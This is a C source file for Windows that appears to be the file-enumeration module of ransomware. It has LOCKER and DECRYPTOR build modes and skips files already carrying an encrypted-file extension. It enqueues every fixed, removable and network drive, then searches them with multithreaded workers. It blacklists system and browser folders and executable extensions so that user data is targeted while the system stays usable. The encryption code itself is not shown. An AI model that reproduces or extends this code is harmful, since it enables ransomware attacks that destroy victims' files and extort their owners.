#include <windows.h>
#include "Common.h"
#include "Queue.h"
#include "Workers.h"
#include "Debug.h"
#include "Bootstrap.h"
#include "Search.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// 

PVOID          g_hPrivateHeap;
QUEUE          g_DirQueue;
QUEUE          g_FileQueue;
LONG           g_nOutstandingDirs = 0;
volatile BOOL  g_Finished = FALSE;


static const WCHAR* g_Blacklist[] = {
    L"AppData", L"Boot", L"Windows", L"Windows.old",
    L"Tor Browser", L"Internet Explorer", L"Google", L"Opera",
    L"Opera Software", L"Mozilla", L"Mozilla Firefox", L"$Recycle.Bin",
    L"ProgramData", L"All Users", L"autorun.inf", L"boot.ini", L"bootfont.bin",
    L"bootsect.bak", L"bootmgr", L"bootmgr.efi", L"bootmgfw.efi", L"desktop.ini",
    L"iconcache.db", L"ntldr", L"ntuser.dat", L"ntuser.dat.log", L"ntuser.ini", L"thumbs.db",
    L"Program Files", L"Program Files (x86)", L"#recycle", L"Recovery"
};

static const WCHAR* g_BlackExts[] = {
    L".exe", L".dll", L".msi", L".sys", L".lnk",
    L".ini", L".inf"
};

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static DWORD GetProcessorCount(void)
{
    SYSTEM_INFO SystemInfo = { 0 };
    GetSystemInfo(&SystemInfo);
    return SystemInfo.dwNumberOfProcessors;
}

// Returns a pointer into FileName at the last '.' found, or NULL if none.
static WCHAR* GetFileExtensionW(const WCHAR* FileName)
{
    WCHAR* wszLastDot = NULL;

    if (!FileName)
        return NULL;

    while (*FileName)
    {
        if (*FileName == L'.')
            wszLastDot = (WCHAR*)FileName;
        FileName++;
    }
    return wszLastDot;
}

static BOOL CheckBlacklist(IN WCHAR* FileName)
{
    if (!FileName || !*FileName)
        return TRUE;

    for (SIZE_T idx = 0; idx < ARRAYSIZE(g_Blacklist); idx++)
    {
        if (lstrcmpiW(FileName, g_Blacklist[idx]) == 0)
            return TRUE;
    }

    return FALSE;
}

static BOOL CheckFileExt(IN WIN32_FIND_DATAW* pFindData)
{
    WCHAR* wExtension = GetFileExtensionW(pFindData->cFileName);

    if (!wExtension)
        return TRUE;    // no extension, allow it

#if defined(LOCKER)
    if (lstrcmpiW(wExtension, ENC_FILE_EXTENSION) == 0)
        return FALSE;   // already encrypted, skip

#elif defined(DECRYPTOR)
    if (lstrcmpiW(wExtension, ENC_FILE_EXTENSION) == 0)
        return TRUE;    // we want this when decrypting
#endif

    for (SIZE_T idx = 0; idx < ARRAYSIZE(g_BlackExts); idx++)
    {
        if (lstrcmpiW(wExtension, g_BlackExts[idx]) == 0)
            return FALSE;   
    }

    return TRUE;
}

// Allocates and enqueues a QUEUE_ITEM for the given path.
// Returns FALSE on allocation failure.
static BOOL AllocAndEnqueueItem(PQUEUE pQueue, LPCWSTR wPath, BOOL bIsDirectory)
{
    PQUEUE_ENTRY NewItem = NULL;
    SIZE_T cchPathLen = lstrlenW(wPath) + 1;

    if (!(NewItem = (PQUEUE_ENTRY)HeapAlloc(g_hPrivateHeap, HEAP_ZERO_MEMORY, sizeof(QUEUE_ENTRY))))
        return FALSE;

    if (!(NewItem->Path = (PWSTR)HeapAlloc(g_hPrivateHeap, HEAP_ZERO_MEMORY, cchPathLen * sizeof(WCHAR))))
    {
        HeapFree(g_hPrivateHeap, 0x00, NewItem);
        return FALSE;
    }

    RtlCopyMemory(NewItem->Path, wPath, cchPathLen * sizeof(WCHAR));

    if (bIsDirectory)
    {
        InterlockedIncrement(&g_nOutstandingDirs);
        Enqueue(&g_DirQueue, NewItem);
    }
    else
    {
        Enqueue(&g_FileQueue, NewItem);
    }

    return TRUE;
}

// Calculates thread counts: max 2 dir threads, remaining cores to file threads.
static VOID GetThreadCounts(OUT DWORD* pdwDirThreadCount, OUT DWORD* pdwFileThreadCount)
{
    DWORD dwCores = GetProcessorCount();
    *pdwDirThreadCount = (dwCores >= 4) ? 2 : 1;
    *pdwFileThreadCount = (dwCores - *pdwDirThreadCount) * 2;
    if (*pdwFileThreadCount < 1)
        *pdwFileThreadCount = 1;
}

// Allocates an array of thread handles on the process heap.
// Caller is responsible for freeing.
static HANDLE* AllocThreadArray(DWORD dwCount)
{
    return (HANDLE*)HeapAlloc(g_hPrivateHeap, HEAP_ZERO_MEMORY, sizeof(HANDLE) * dwCount);
}

// Signals file consumer threads that no more work is coming.
static INLINE VOID FinalizeFileQueue(void)
{
    AcquireSRWLockExclusive(&g_FileQueue.Lock);
    g_Finished = TRUE;
    WakeAllConditionVariable(&g_FileQueue.NonEmpty);
    ReleaseSRWLockExclusive(&g_FileQueue.Lock);
}

// Closes and frees an array of thread handles.
static VOID CleanupThreadArray(HANDLE* hThreads, DWORD dwCount)
{
    if (!hThreads || dwCount == 0)
        return;

    for (DWORD idx = 0; idx < dwCount; idx++)
    {
        if (hThreads[idx])
            CloseHandle(hThreads[idx]);
    }
    HeapFree(g_hPrivateHeap, 0x00, hThreads);
}

// Enumerates a given directory and enqueues non-blacklisted files and paths
VOID EnumerateDirectoryW(IN PWSTR wDirectoryPath)
{
    WIN32_FIND_DATAW FindDataW = { 0 };
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WCHAR wSearchPath[MAX_PATH] = { 0 };
    WCHAR wFullPath[MAX_PATH] = { 0 };
    ULONGLONG qwFileSize = 0;
    SIZE_T cchBaseLen = 0;
    BOOL bEndsWithSlash = FALSE;

    if (!wDirectoryPath)
        return;

    cchBaseLen = lstrlenW(wDirectoryPath);

    if (cchBaseLen == 0 || cchBaseLen >= MAX_PATH - 3)
        return;

    bEndsWithSlash = (wDirectoryPath[cchBaseLen - 1] == L'\\');

    if (bEndsWithSlash)
        wsprintfW(wSearchPath, L"%s*", wDirectoryPath);
    else
        wsprintfW(wSearchPath, L"%s\\*", wDirectoryPath);

    if ((hFind = FindFirstFileW(wSearchPath, &FindDataW)) == INVALID_HANDLE_VALUE)
        return;

    do
    {
        BOOL bIsDirectory = FALSE;

        if (lstrcmpW(FindDataW.cFileName, L".") == 0 || lstrcmpW(FindDataW.cFileName, L"..") == 0)
            continue;

        if (FindDataW.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
        {
            DbgPrintW(L"[-] SKIPPED: %s\\%s (Reason: Reparse Point)\n", wDirectoryPath, FindDataW.cFileName);
            continue;
        }

        if (CheckBlacklist(FindDataW.cFileName))
        {
            DbgPrintW(L"[-] SKIPPED: %s\\%s (Reason: BlackList) \n", wDirectoryPath, FindDataW.cFileName);
            continue;
        }

        bIsDirectory = (FindDataW.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? TRUE : FALSE;

        // Build full path
        if (bEndsWithSlash)
            wsprintfW(wFullPath, L"%s%s", wDirectoryPath, FindDataW.cFileName);
        else
            wsprintfW(wFullPath, L"%s\\%s", wDirectoryPath, FindDataW.cFileName);

        if (bIsDirectory)
        {
            // Append trailing backslash for directories
            lstrcatW(wFullPath, L"\\");
        }
        else
        {
            qwFileSize = ((ULONGLONG)FindDataW.nFileSizeHigh << 32) | FindDataW.nFileSizeLow;

            if (qwFileSize == 0)
            {
                DbgPrintW(L"[-] SKIPPED: %s (Reason: Empty File) \n", wFullPath);
                continue;
            }


            // Check extension
            if (!CheckFileExt(&FindDataW))
            {
                DbgPrintW(L"[-] SKIPPED: %s (Reason: Bad Ext)\n", wFullPath);
                continue;
            }
        }

        if (AllocAndEnqueueItem(bIsDirectory ? &g_DirQueue : &g_FileQueue, wFullPath, bIsDirectory) && bIsDirectory)
        {
            DbgPrintW(L"[>>] ENQUEUED:  %s\n", wFullPath);
        }

    } while (FindNextFileW(hFind, &FindDataW));

    FindClose(hFind);
}

static LPCWSTR GetDriveTypeStringW(UINT uType)
{
    switch (uType)
    {
    case DRIVE_FIXED:       return L"Fixed";
    case DRIVE_REMOVABLE:   return L"Removable";
    case DRIVE_REMOTE:      return L"Network";
    case DRIVE_CDROM:       return L"CD-ROM";
    case DRIVE_RAMDISK:     return L"RAM Disk";
    case DRIVE_NO_ROOT_DIR: return L"No Root";
    default:                return L"Unknown";
    }
}

static BOOL EnqueueExistingDrives(void)
{
    DWORD dwBitmask = 0;
    UINT  uDriveType = 0;
    WCHAR wDriveRoot[4] = { 0 };

    if ((dwBitmask = GetLogicalDrives()) == 0)
    {
        PRNT_WIN_ERR(GetLogicalDrives);
        return FALSE;
    }

    for (WCHAR wLetter = L'A'; wLetter <= L'Z'; wLetter++)
    {
        INT bitShift = wLetter - L'A';

        if (!(dwBitmask & (1 << bitShift)))
            continue;

        wDriveRoot[0] = wLetter;
        wDriveRoot[1] = L':';
        wDriveRoot[2] = L'\\';
        wDriveRoot[3] = L'\0';

        uDriveType = GetDriveTypeW(wDriveRoot);

        if (uDriveType == DRIVE_FIXED || uDriveType == DRIVE_REMOVABLE || uDriveType == DRIVE_REMOTE)
        {
            if (!AllocAndEnqueueItem(&g_DirQueue, wDriveRoot, TRUE))
            {
                PRNT_WIN_ERR(HeapAlloc); // reason: function wraps HeapAlloc
                continue;
            }

            DbgPrintW(L"[>>] ENQUEUED: %s (Drive Type: %s) \n", wDriveRoot, GetDriveTypeStringW(uDriveType));
        }
        else
        {
            DbgPrintW(L"[-] SKIPPED: %s (Drive Type: %s) \n", wDriveRoot, GetDriveTypeStringW(uDriveType));
        }
    }

    return TRUE;
}

BOOL StartLocalSearch(void)
{
    HANDLE* hDirThreads = NULL;
    HANDLE* hFileThreads = NULL;
    DWORD dwDirThreadCount = 0;
    DWORD dwFileThreadCount = 0;

    if (!(g_hPrivateHeap = HeapCreate(0, 0, 0)))
        return FALSE;
    
    CreateQueue(&g_DirQueue);
    CreateQueue(&g_FileQueue);
    GetThreadCounts(&dwDirThreadCount, &dwFileThreadCount);

    // Enqueue all eligible local drives as starting points
    g_nOutstandingDirs = 0;

    if (!EnqueueExistingDrives())
        return FALSE;

    // Create Directory Worker Threads
    if (!(hDirThreads = AllocThreadArray(dwDirThreadCount)))
        return FALSE;

    for (ULONG idx = 0; idx < dwDirThreadCount; idx++)
    {
        if (!(hDirThreads[idx] = CreateThread(NULL, 0, DirectoryWorkerThread, NULL, 0, NULL)))
            goto CLEANUP;
    }

    // Create File Consumer Threads
    if (!(hFileThreads = AllocThreadArray(dwFileThreadCount)))
        goto CLEANUP;

    for (ULONG idx = 0; idx < dwFileThreadCount; idx++)
    {
        if (!(hFileThreads[idx] = CreateThread(NULL, 0, FileConsumerThread, NULL, 0, NULL)))
            goto CLEANUP;
    }

    // Wait for discovery phase
    WaitForMultipleObjects(dwDirThreadCount, hDirThreads, TRUE, INFINITE);

    // Nudge file threads, no more work is coming
    FinalizeFileQueue();

    // Wait for processing phase
    WaitForMultipleObjects(dwFileThreadCount, hFileThreads, TRUE, INFINITE);

CLEANUP:
    CleanupThreadArray(hDirThreads, dwDirThreadCount);
    CleanupThreadArray(hFileThreads, dwFileThreadCount);
    HeapDestroy(g_hPrivateHeap);
    return TRUE;
}
